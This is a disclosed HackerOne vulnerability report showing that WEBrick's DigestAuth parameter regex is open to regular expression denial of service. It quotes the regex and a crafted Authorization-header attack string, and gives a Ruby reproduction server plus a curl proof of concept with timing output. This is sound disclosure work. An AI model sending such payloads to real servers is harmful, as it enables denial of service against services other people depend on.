# WEBrick::HTTPAuth::DigestAuth authentication is vulnerable to regular expression denial of service (ReDoS)

## Report Details
- **Report ID**: 661722
- **URL**: https://hackerone.com/reports/661722
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-07-27T05:44:24.810Z
- **Disclosed**: 2019-11-15T23:20:45.123Z

## Reporter
- **Username**: 358
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
The private instance method `split_param_value` in class `WEBrick::HTTPAuth::DigestAuth` uses a regular expression that is vulnerable to denial of service due to catastrophic backtracking.

The regular expression is: ^\s*([\w\-\.\*\%\!]+)=\s*\"((\\.|[^\"])*)\"\s*,?
Source: https://github.com/ruby/ruby/blob/149e414ed529d27aaeb0543bc133e08c782d8d41/lib/webrick/httpauth/digestauth.rb#L295

Sample attack string that causes catastrophic backtracking: a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b

The issue can be reproduced with the following HTTP server configured with DigestAuth:

```
#!/usr/bin/env ruby

require 'webrick'

config = { :Realm => 'DigestAuth example realm' }

htdigest = WEBrick::HTTPAuth::Htdigest.new 'my_password_file'
htdigest.set_passwd config[:Realm], 'username', 'password'
htdigest.flush

config[:UserDB] = htdigest

digest_auth = WEBrick::HTTPAuth::DigestAuth.new config

auth_handler = proc do |request, response|
  digest_auth.authenticate request, response
end

server = WEBrick::HTTPServer.new :Port => 8000, :RequestCallback => auth_handler

server.mount_proc '/' do |req, res|
  res.body = 'hello, world'
end

trap 'INT' do server.shutdown end
server.start
```

Running the program above, an attacker can cause the HTTP server to consume 100% CPU by sending an authorization header that exploits the catastrophic backtracking.

Sample HTTP request with cURL:
```sh
$ time curl -I --header 'Authorization: Digest a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b' http://localhost:8000
HTTP/1.1 400 Bad Request 
Content-Type: text/html; charset=ISO-8859-1
Server: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)
Date: Sat, 27 Jul 2019 05:38:27 GMT
Content-Length: 291
Connection: close


real	0m9.714s
user	0m0.013s
sys	0m0.003s
```

Note that it takes the HTTP server 9 seconds to respond that it's a bad request. A larger attack string, like 'Authorization: Digest a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b', would take much longer to evaluate.

## Impact

An attacker could cause an effective denial of service, by crafting an input which exploits catastrophic backtracking for the regular expression.

## Attachments
No attachments
